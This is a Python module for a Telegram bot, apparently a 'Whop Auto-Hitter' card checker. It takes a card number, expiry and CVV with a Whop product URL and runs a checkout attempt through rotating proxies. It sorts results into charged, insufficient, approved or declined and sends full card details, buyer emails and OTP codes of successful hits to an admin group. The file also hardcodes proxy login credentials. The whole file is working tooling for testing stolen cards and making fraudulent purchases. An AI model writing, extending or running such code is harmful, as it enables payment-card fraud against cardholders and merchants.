import sys
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

def _safe_print(*args, **kwargs):
    try:
        sys.stdout.write(" ".join(str(a) for a in args) + kwargs.get("end", "\n"))
        sys.stdout.flush()
    except Exception:
        pass

print = _safe_print

import asyncio
import re
import html
import logging
import time
import psycopg2.extras
import json
import random
import urllib.parse
from datetime import datetime

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AIogram Imports
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from aiogram import types, F, Router
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LOCAL IMPORTS — fully defensive so a missing module
# doesn't take the whole bot down with an ImportError.
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from database import (
    is_gate_enabled,
    get_db_connection,
    create_user,
    update_user_stats,
    get_premium_status,
)

# `sub.get_hitter_status` does not exist in this build.
# `database.get_premium_status` returns (bool, Optional[datetime])
# which is exactly what the rest of this file expects.
get_hitter_status = get_premium_status

try:
    from bin import get_bin_info
except ImportError:
    try:
        from tools.binn import get_bin_info
    except ImportError:
        logging.warning("[whop] get_bin_info not found — using empty stub.")
        async def get_bin_info(bin_number):
            return {}

try:
    from utils_send import safe_send_message
except ImportError:
    logging.warning("[whop] utils_send.safe_send_message not found — using direct send_message wrapper.")
    async def safe_send_message(bot, chat_id, text, **kwargs):
        try:
            await bot.send_message(chat_id=chat_id, text=text, **kwargs)
        except Exception as e:
            logging.error(f"[whop] safe_send_message fallback failed: {e}")

from gates.whop_hitter import WhopHitter

router = Router()

def to_math_bold(s: str) -> str:
    if not s:
        return ""
    bold_map = {
        'a':'𝗮','b':'𝗯','c':'𝗰','d':'𝗱','e':'𝗲','f':'𝗳','g':'𝗴','h':'𝗵','i':'𝗶','j':'𝗷','k':'𝗸','l':'𝗹','m':'𝗺','n':'𝗻','o':'𝗼','p':'𝗽','q':'𝗾','r':'𝗿','s':'𝘀','t':'𝘁','u':'𝘂','v':'𝘃','w':'𝘄','x':'𝘅','y':'𝘆','z':'𝘇',
        'A':'𝗔','B':'𝗕','C':'𝗖','D':'𝗗','E':'𝗘','F':'𝗙','G':'𝗚','H':'𝗛','I':'𝗜','J':'𝗝','K':'𝗞','L':'𝗟','M':'𝗠','N':'𝗡','O':'𝗢','P':'𝗣','Q':'𝗤','R':'𝗥','S':'𝗦','T':'𝗧','U':'𝗨','V':'𝗩','W':'𝗪','X':'𝗫','Y':'𝗬','Z':'𝗭',
        '0':'𝟬','1':'𝟭','2':'𝟮','3':'𝟯','4':'𝟰','5':'𝟱','6':'𝟲','7':'𝟳','8':'𝟴','9':'𝟵'
    }
    raw = "".join(bold_map.get(c, c) for c in str(s))
    return html.escape(raw, quote=False)

user_last_command_time = {}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ADMIN IDS — synced with main.py
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
ADMIN_IDS = {6962534443, 8428369446}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BROADCAST CONFIG
#
# Both groups receive ONLY:
#   • CHARGED cards 💎     (order placed successfully)
#   • INSUFFICIENT cards 💰 (insufficient funds)
#
# Declined / 3DS / incorrect-CVC / errors are NEVER broadcast.
# They appear only in the user's private /whop reply.
#
# ── CHARGED_GROUP_CHAT_ID (admin)   → FULL details
#      header + Whop URL + CC + gate + response + plan +
#      email + OTP + proxy + all BIN fields + time + user + dev
#
# ── SUMMARY_GROUP_CHAT_ID (summary) → SHORT version
#      header (with WHOP) + gate + response + plan + user
#      (NO CC, NO URL, NO BIN, NO email, NO OTP, NO proxy, NO time, NO dev)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
CHARGED_GROUP_CHAT_ID = -1004437051761

# ⚠️ Replace the placeholder below with your summary group's real chat ID.
#    Must start with -100. The bot must be a member with Send Messages.
SUMMARY_GROUP_CHAT_ID = -1004479507133  # ← REPLACE

DEFAULT_ADMIN_PROXIES = [
    "http://1351:IBd1Fk5CuUNZ@p103.squidproxies.com:9087",
    "http://1401:FVRHsSXw2DNK@p103.squidproxies.com:9238",
    "http://1439:jqvFsDEZ&%Sm@p102.squidproxies.com:9292",
    "http://1439:jqvFsDEZ&%Sm@p103.squidproxies.com:9291",
]

DEFAULT_WHOP_URL = "https://whop.com/selfmade-society/selfmade-society?a=oozaruh"

def normalize_proxy(proxy: str) -> str:
    if not proxy or not proxy.strip():
        return ""
    proxy = proxy.strip()
    if proxy.startswith(('http://', 'https://')):
        return proxy
    if proxy.startswith('socks5://'):
        return 'http://' + proxy[9:]
    if '@' in proxy and ':' in proxy.split('@')[0]:
        return f'http://{proxy}'
    parts = proxy.split()
    if len(parts) == 4:
        user, pwd, host, port = parts
        return f'http://{user}:{pwd}@{host}:{port}'
    if ':' in proxy and '@' not in proxy:
        parts = proxy.split(':')
        if len(parts) == 2 and parts[1].isdigit():
            return f'http://{proxy}'
    return f'http://{proxy}'

async def get_user_live_proxies(user_id: int):
    proxies = []
    try:
        def _sync_fetch():
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute("SELECT proxy FROM proxies WHERE user_id = %s", (user_id,))
            rows = cursor.fetchall()
            conn.close()
            return [row[0] for row in rows]
        proxies = await asyncio.to_thread(_sync_fetch)
    except Exception as e:
        logging.error(f"Error fetching proxies for user {user_id}: {e}")

    normalized = [normalize_proxy(p) for p in proxies if normalize_proxy(p)]
    if normalized:
        return normalized, False
    return DEFAULT_ADMIN_PROXIES[:], True

async def get_user_plan_name(user_id):
    is_premium, _ = await asyncio.to_thread(get_hitter_status, user_id)
    if is_premium:
        try:
            def _sync_fetch():
                conn = get_db_connection()
                cursor = conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
                cursor.execute("SELECT plan FROM receipts WHERE user_id = %s ORDER BY purchased_on DESC LIMIT 1", (user_id,))
                row = cursor.fetchone()
                conn.close()
                if row:
                    p = row['plan'].lower()
                    if any(k in p for k in ["kashim", "chirag", "zlatan"]): return 'Zlatan <tg-emoji emoji-id="5039727497143387500">👑</tg-emoji>'
                    if "root" in p: return '𝗥𝗼𝗼𝘁 <tg-emoji emoji-id="5039727497143387500">👑</tg-emoji>'
                    if "elite" in p: return '𝗘𝗹𝗶𝘁𝗲 ⭐'
                    if "core" in p: return '𝗖𝗼𝗿𝗲 <tg-emoji emoji-id="5042274086332400375">🛠️</tg-emoji>'
                    return row['plan']
                return "PREMIUM"
            return await asyncio.to_thread(_sync_fetch)
        except Exception as e:
            logging.error(f"Error fetching plan name: {e}")
        return "PREMIUM"
    else:
        return "TRIAL"

def luhn_check(card_number: str) -> bool:
    card_number = str(card_number).strip()
    if not card_number.isdigit():
        return False
    total = 0
    reverse_digits = card_number[::-1]
    for i, char in enumerate(reverse_digits):
        digit = int(char)
        if i % 2 == 1:
            digit *= 2
            if digit > 9:
                digit -= 9
        total += digit
    return total % 10 == 0

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# COMMAND HANDLER: /whop <url> <cc>
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(F.text.regexp(r'^/(?:whop|whophit)(?:\s|$)'))
async def whop_command(message: types.Message):
    if not await asyncio.to_thread(is_gate_enabled, "whop"):
        await message.reply(
            "<tg-emoji emoji-id='4958926882994127612'>🚧</tg-emoji> <b>𝗪𝗵𝗼𝗽 𝗛𝗶𝘁𝘁𝗲𝗿 𝗶𝘀 𝘂𝗻𝗱𝗲𝗿 𝗺𝗮𝗶𝗻𝘁𝗲𝗻𝗮𝗻𝗰𝗲.</b>\n"
            "𝗜𝘁 𝘄𝗶𝗹𝗹 𝗯𝗲 𝗯𝗮𝗰𝗸 𝘀𝗵𝗼𝗿𝘁𝗹𝘆 𝘄𝗶𝘁𝗵 𝗲𝘅𝗰𝗶𝘁𝗶𝗻𝗴 𝗶𝗺𝗽𝗿𝗼𝘃𝗲𝗺𝗲𝗻𝘁𝘀.<tg-emoji emoji-id='5341715473882955310'>⚙️</tg-emoji>",
            parse_mode="HTML"
        )
        return

    user = message.from_user
    user_id = user.id
    current_time = time.time()

    is_premium, _ = await asyncio.to_thread(get_hitter_status, user_id)

    if not is_premium and user_id not in ADMIN_IDS:
        if user_id in user_last_command_time:
            elapsed = current_time - user_last_command_time[user_id]
            if elapsed < 10:
                remaining_time = round(10 - elapsed, 1)
                await message.reply(
                    f"<tg-emoji emoji-id='6237864166879663987'>❌</tg-emoji> <b>𝗦𝗹𝗼𝘄 𝗗𝗼𝘄𝗻!</b>\n"
                    f"𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 <code>{remaining_time}</code> 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝗯𝗲𝗳𝗼𝗿𝗲 𝗰𝗼𝗻𝘁𝗶𝗻𝘂𝗶𝗻𝗴.\n"
                    f"<tg-emoji emoji-id='5042050649248760772'>💎</tg-emoji> 𝗨𝗻𝗹𝗼𝗰𝗸 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗳𝗼𝗿 𝗶𝗻𝘀𝘁𝗮𝗻𝘁, 𝘂𝗻𝗹𝗶𝗺𝗶𝘁𝗲𝗱 𝘂𝘀𝗲.",
                    parse_mode="HTML"
                )
                return
        user_last_command_time[user_id] = current_time

    full_text = message.text or ""
    if message.reply_to_message:
        full_text += " " + (message.reply_to_message.text or message.reply_to_message.caption or "")

    url_match = re.search(r'(https?://(?:www\.)?whop\.com/[^\s]+)', full_text)
    if not url_match:
        await message.reply(
            "<b><tg-emoji emoji-id='4915853119839011973'>⚠️</tg-emoji> 𝗠𝗶𝘀𝘀𝗶𝗻𝗴 𝗪𝗵𝗼𝗽 𝗟𝗶𝗻𝗸:</b>\n"
            "You must provide a valid Whop product URL!\n\n"
            "<b>Usage:</b>\n"
            "<code>/whop &lt;whop_url&gt; &lt;cc|mm|yy|cvv&gt;</code>\n\n"
            "<b>Example:</b>\n"
            "<code>/whop https://whop.com/arts-crypto-circle/arts-crypto-circle-monthly23?a=wickyone 4242424242424242|05|28|123</code>",
            parse_mode="HTML"
        )
        return

    whop_url = url_match.group(1).strip()

    cc_pattern = r'\b(\d{15,16})[|\s/?\\:]+(\d{2,4})[|\s/?\\:]+(\d{2,4})[|\s/?\\:]+(\d{3,4})\b'
    cc_match = re.search(cc_pattern, full_text)

    if not cc_match:
        await message.reply(
            "<b><tg-emoji emoji-id='4915853119839011973'>⚠️</tg-emoji> 𝗨𝘀𝗮𝗴𝗲:</b>\n"
            "<code>/whop &lt;whop_url&gt; &lt;cc|mm|yy|cvv&gt;</code>\n\n"
            "<b>Example:</b>\n"
            "<code>/whop https://whop.com/arts-crypto-circle/arts-crypto-circle-monthly23?a=wickyone 4242424242424242|05|28|123</code>\n"
            "<i>Or reply to a message containing a card or Whop link.</i>",
            parse_mode="HTML"
        )
        return

    cc, mm, yy_raw, cvv = cc_match.groups()
    yy = yy_raw[2:] if len(yy_raw) == 4 else yy_raw
    formatted_cc = f"{cc}|{mm}|{yy}|{cvv}"

    if not luhn_check(cc):
        await message.reply(
            "<tg-emoji emoji-id='4915853119839011973'>⚠️</tg-emoji> <b>Invalid Card</b>\n"
            "Your card number is incorrect.",
            parse_mode="HTML"
        )
        return

    user_proxies, is_admin_fallback = await get_user_live_proxies(user_id)
    selected_proxy = random.choice(user_proxies) if user_proxies else None

    plan_name = await get_user_plan_name(user_id)

    user_link = f"<a href='tg://user?id={user_id}'>{user.first_name}</a>"
    proc_msg = await message.reply(
        f"𝗧𝗼𝘁𝗮𝗹 𝗖𝗮𝗿𝗱𝘀 ➛ <code>1</code>\n"
        f"<tg-emoji emoji-id='5456140674028019486'>⚡</tg-emoji> 𝗧𝗶𝗺𝗲 ➛ <code>0.0s</code>\n"
        f"<tg-emoji emoji-id='6237927637906364256'>👤</tg-emoji> 𝗨𝘀𝗲𝗿 ➛ {user_link}\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"<tg-emoji emoji-id='5039579582764680065'>⏳</tg-emoji> <b>𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴 𝗪𝗵𝗼𝗽 𝗖𝗵𝗲𝗰𝗸𝗼𝘂𝘁 𝗛𝗶𝘁...</b>",
        parse_mode="HTML"
    )

    asyncio.create_task(
        process_whop_check(
            message, proc_msg, user, user_id, formatted_cc, cc, mm, yy, cvv,
            whop_url, selected_proxy, plan_name, is_admin_fallback
        )
    )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BACKGROUND PROCESSOR
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_whop_check(message, proc_msg, user, user_id, formatted_cc, cc, mm, yy, cvv,
                             whop_url, selected_proxy, plan_name, is_admin_fallback):
    try:
        start_time = time.time()
        try:
            await asyncio.to_thread(create_user, user_id, user.username)
        except Exception as e:
            logging.error(f"Error ensuring user exists: {e}")

        CUSTOM_CHARGED_EMOJI_ID = "5343636681473935403"
        CUSTOM_APPROVED_EMOJI_ID = "5039844895779455925"
        CUSTOM_INSUFFICIENT_EMOJI_ID = "5039844895779455925"
        CUSTOM_DECLINED_EMOJI_ID = "4915853119839011973"

        status_raw = "DECLINED"
        res_message = "Unknown Error"
        elapsed = 0.0
        plan_id = "N/A"
        buyer_email = ""
        otp_code = "N/A"

        try:
            hitter = WhopHitter(proxy=selected_proxy)
            result = await hitter.hit(url=whop_url, email=None, card=formatted_cc)

            resp_code = str(result.get("Response", "")).upper()
            if selected_proxy and any(k in resp_code for k in ("PAGE_ERROR", "CHECKOUT_INIT_FAILED", "PATCH_EXCEPTION", "PATCH_FAILED", "CREATE_FAILED", "CREATE_EXCEPTION", "EMBED_EXCEPTION", "TOKEN_EXCEPTION", "FAILED TO CONNECT", "INCOMPLETE")):
                logging.warning(f"Selected proxy failed for Whop check ({resp_code}), falling back to direct connection...")
                hitter = WhopHitter(proxy=None)
                result = await hitter.hit(url=whop_url, email=None, card=formatted_cc)

            status_raw = str(result.get("Status", "DECLINED")).upper()
            res_message = str(result.get("Response", "Declined"))
            if res_message in ("PATCH_FAILED", "PATCH_EXCEPTION") and result.get("Message"):
                res_message = str(result.get("Message"))
            plan_id = result.get("Plan", "N/A")
            buyer_email = result.get("Email", "")
            otp_code = result.get("OTP", "N/A")
            elapsed = round(time.time() - start_time, 2)
        except Exception as ex:
            logging.error(f"Whop check exception: {ex}")
            status_raw = "ERROR"
            res_message = str(ex)[:80]
            otp_code = "N/A"
            elapsed = round(time.time() - start_time, 2)

        # ── Classification ────────────────────────────────────────
        # is_charged       → true only for ORDER_PLACED / charged
        # is_insufficient  → true for INSUFFICIENT_FUNDS specifically
        # is_approved      → true for other approvals (3DS, incorrect cvc, etc.)
        #   Only is_charged and is_insufficient get broadcast.
        is_charged = False
        is_insufficient = False
        is_approved = False
        msg_lower = res_message.lower()

        if status_raw == "CHARGED" and ("placed successfully" in msg_lower or "order placed" in msg_lower):
            final_status = f'𝗖𝗛𝗔𝗥𝗚𝗘𝗗 <tg-emoji emoji-id=\"{CUSTOM_CHARGED_EMOJI_ID}\">💎</tg-emoji>'
            is_charged = True
        elif "insufficient" in msg_lower or "not enough funds" in msg_lower or "no funds" in msg_lower:
            final_status = f'𝗜𝗡𝗦𝗨𝗙𝗙𝗜𝗖𝗜𝗘𝗡𝗧 <tg-emoji emoji-id=\"{CUSTOM_INSUFFICIENT_EMOJI_ID}\">💰</tg-emoji>'
            is_insufficient = True
        elif status_raw in ("APPROVED", "LIVE") or any(k in msg_lower for k in ["incorrect cvc", "security code", "3d", "authenticate", "zip code"]):
            final_status = f'𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 <tg-emoji emoji-id=\"{CUSTOM_APPROVED_EMOJI_ID}\">✅</tg-emoji>'
            is_approved = True
        elif status_raw == "DECLINED" or any(k in msg_lower for k in ["declined", "card_declined", "do_not_honor", "generic_decline", "incomplete", "failed"]):
            final_status = f'𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 <tg-emoji emoji-id=\"{CUSTOM_DECLINED_EMOJI_ID}\">❌</tg-emoji>'
        else:
            final_status = f'𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 <tg-emoji emoji-id=\"{CUSTOM_DECLINED_EMOJI_ID}\">❌</tg-emoji>'

        try:
            bin_info = await get_bin_info(cc[:6])
        except Exception as e:
            logging.error(f"Bin lookup error: {e}")
            bin_info = {}

        bin_scheme = bin_info.get("scheme", "N/A")
        card_type = bin_info.get("type", "N/A")
        level = bin_info.get("brand", "N/A")
        bin_bank = bin_info.get("bank", "N/A")
        country_name = bin_info.get("country", "N/A")
        country_flag = bin_info.get("country_emoji", "")
        bin_country = f"{country_flag} {country_name}" if country_flag else country_name

        try:
            await asyncio.to_thread(update_user_stats, user_id, is_charged)
        except Exception as e:
            logging.error(f"Failed to update stats: {e}")

        user_name_safe = html.escape(user.first_name or "User")
        user_link = f'<a href="tg://user?id={user.id}">{user_name_safe}</a>'
        dev_link = '<a href="https://t.me/Salluuxx">Zlatan</a>'
        user_display = f"{user_link} ({plan_name})"

        proxy_indicator = "Admin Proxy (Default)" if is_admin_fallback else "User Proxy"

        email_display = f"<code>{html.escape(buyer_email)}</code>" if buyer_email else "<code>N/A</code>"
        otp_display = f"<code>{html.escape(otp_code)}</code>" if otp_code and otp_code != "N/A" else "<code>Direct Multi-PSP</code>"

        final_caption = (
            f"<b><tg-emoji emoji-id='5386367538735104399'>🆕</tg-emoji> {final_status}!</b>\n\n"
            f"<b><tg-emoji emoji-id='5039623284056917259'>💳</tg-emoji> 𝗖𝗖:</b> <code><b>{formatted_cc}</b></code>\n"
            f"<b><tg-emoji emoji-id='5039895103947146186'>🌐</tg-emoji> 𝗚𝗮𝘁𝗲:</b> {to_math_bold('Whop Auto-Hitter')}\n"
            f"<b><tg-emoji emoji-id='5040042498634810056'>💬</tg-emoji> 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲:</b> {to_math_bold(str(res_message or 'N/A'))}\n"
            f"<b><tg-emoji emoji-id='5039727497143387500'>📦</tg-emoji> 𝗣𝗹𝗮𝗻:</b> <code>{html.escape(str(plan_id))}</code>\n"
            f"<b>📧 𝗘𝗺𝗮𝗶𝗹:</b> {email_display}\n"
            f"<b>🔑 𝗢𝗧𝗣:</b> {otp_display}\n"
            f"<b><tg-emoji emoji-id='5341715473882955310'>🛡️</tg-emoji> 𝗣𝗿𝗼𝘅𝘆:</b> <code>{proxy_indicator}</code>\n\n"
            f"<b><tg-emoji emoji-id='5042329873662609701'>🗑️</tg-emoji> 𝗕𝗜𝗡 𝗜𝗻𝗳𝗼:</b>\n"
            f"<b><tg-emoji emoji-id='5039753786638205957'>🔹</tg-emoji> 𝗕𝗿𝗮𝗻𝗱:</b> {to_math_bold(str(bin_scheme or 'N/A'))}\n"
            f"<b><tg-emoji emoji-id='5042020176455795565'>🔸</tg-emoji> 𝗧𝘆𝗽𝗲:</b> {to_math_bold(str(card_type or 'N/A'))}\n"
            f"<b><tg-emoji emoji-id='5042097984083330584'>🔘</tg-emoji> 𝗟𝗲𝘃𝗲𝗹:</b> {to_math_bold(str(level or 'N/A'))}\n"
            f"<b><tg-emoji emoji-id='5343636681473935403'>🏛️</tg-emoji> 𝗕𝗮𝗻𝗸:</b> {to_math_bold(str(bin_bank or 'N/A'))}\n"
            f"<b><tg-emoji emoji-id='5042176294222037888'>🌍</tg-emoji> 𝗖𝗼𝘂𝗻𝘁𝗿𝘆:</b> {to_math_bold(str(bin_country or 'N/A'))}\n"
            f"━━━━━━━━━━━━━━━━\n\n"
            f"<b><tg-emoji emoji-id='5039579582764680065'>⏳</tg-emoji> 𝗧𝗶𝗺𝗲 ➛</b> <code>{elapsed}s</code>\n"
            f"<tg-emoji emoji-id='6237927637906364256'>👤</tg-emoji> <b>𝗨𝘀𝗲𝗿 ➛</b> {user_display}\n"
            f"<tg-emoji emoji-id='5039653765439816618'>🐈‍⬛</tg-emoji> <b>𝗗𝗲𝘃 ➛</b> {dev_link}"
        )

        reply_markup = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="ZLATAN", url="https://t.me/zlatanchecker_bot", icon_custom_emoji_id="5042097984083330584", style="primary")]
        ])

        try:
            await proc_msg.edit_text(
                text=final_caption,
                parse_mode="HTML",
                reply_markup=reply_markup
            )
        except Exception as e:
            logging.error(f"Error editing message with HTML: {e}")
            try:
                await message.reply(
                    text=final_caption,
                    parse_mode="HTML",
                    reply_markup=reply_markup
                )
            except Exception as e2:
                logging.error(f"Fallback reply with HTML failed: {e2}")
                try:
                    plain_caption = re.sub(r'<[^>]+>', '', final_caption)
                    await proc_msg.edit_text(
                        text=plain_caption,
                        reply_markup=reply_markup
                    )
                except Exception as e3:
                    logging.error(f"Plain text edit failed: {e3}")
                    try:
                        await message.reply(text=plain_caption)
                    except Exception:
                        pass

        # ── Broadcast — TWO groups, CHARGED + INSUFFICIENT only ──
        #   1. CHARGED_GROUP_CHAT_ID (admin)   → FULL details
        #   2. SUMMARY_GROUP_CHAT_ID (summary) → SHORT version, no CC
        if is_charged or is_insufficient:
            if is_charged:
                header         = "<b>💎 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 𝗛𝗜𝗧 💎</b>"
                summary_header = "<b>💎 𝗪𝗛𝗢𝗣 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 𝗛𝗜𝗧 💎</b>"
                badge          = "CHARGED"
            else:
                header         = "<b>💰 𝗜𝗡𝗦𝗨𝗙𝗙𝗜𝗖𝗜𝗘𝗡𝗧 𝗛𝗜𝗧 💰</b>"
                summary_header = "<b>💰 𝗪𝗛𝗢𝗣 𝗜𝗡𝗦𝗨𝗙𝗙𝗜𝗖𝗜𝗘𝗡𝗧 𝗛𝗜𝗧 💰</b>"
                badge          = "INSUFFICIENT"

            # ── 1. Admin group — FULL details ──
            url_line = f"<b>🔗 𝗪𝗵𝗼𝗽 𝗨𝗥𝗟:</b> <code>{html.escape(whop_url)}</code>\n"

            full_text = (
                f"{header}\n"
                f"━━━━━━━━━━━━━━━━\n"
                f"{url_line}"
                f"━━━━━━━━━━━━━━━━\n"
                f"{final_caption}"
            )

            try:
                await safe_send_message(
                    message.bot,
                    chat_id=CHARGED_GROUP_CHAT_ID,
                    text=full_text,
                    parse_mode="HTML",
                    reply_markup=reply_markup,
                )
            except Exception as e:
                logging.error(f"Whop broadcast → CHARGED_GROUP_CHAT_ID (full) failed: {e}")

            # ── 2. Summary group — SHORT version (no CC, no URL, no BIN/email/OTP) ──
            short_text = (
                f"{summary_header}\n"
                f"<b>🌐 𝗚𝗮𝘁𝗲:</b> 𝗪𝗵𝗼𝗽 𝗔𝘂𝘁𝗼-𝗛𝗶𝘁𝘁𝗲𝗿\n"
                f"━━━━━━━━━━━━━━━━\n"
                f"<b>💬 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲:</b> {html.escape(str(res_message or badge))}\n"
                f"<b>📦 𝗣𝗹𝗮𝗻:</b> <code>{html.escape(str(plan_id))}</code>\n"
                f"<b>👤 𝗨𝘀𝗲𝗿:</b> {user_display}"
            )

            try:
                await safe_send_message(
                    message.bot,
                    chat_id=SUMMARY_GROUP_CHAT_ID,
                    text=short_text,
                    parse_mode="HTML",
                    reply_markup=reply_markup,
                )
            except Exception as e:
                logging.error(f"Whop broadcast → SUMMARY_GROUP_CHAT_ID (short) failed: {e}")

    except Exception as fatal_err:
        logging.error(f"Fatal unhandled exception in process_whop_check: {fatal_err}", exc_info=True)
        try:
            await proc_msg.edit_text(
                f"⚠️ <b>Check Failed:</b> {html.escape(str(fatal_err)[:100])}",
                parse_mode="HTML"
            )
        except Exception:
            try:
                await proc_msg.edit_text(f"⚠️ Check Failed: {str(fatal_err)[:100]}")
            except Exception:
                pass
